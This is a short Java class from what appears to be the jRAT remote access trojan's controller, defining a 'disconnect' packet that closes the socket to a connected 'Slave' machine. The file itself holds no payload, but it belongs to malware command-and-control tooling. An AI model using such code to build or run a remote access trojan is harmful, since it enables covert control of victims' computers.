package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import jrat.controller.exceptions.CloseException;


public class Packet11Disconnect implements OutgoingPacket {

	@Override
	public void write(Slave slave) throws Exception {
		slave.closeSocket(new CloseException("Disconnecting"));
	}

	@Override
	public short getPacketId() {
		return 11;
	}

}
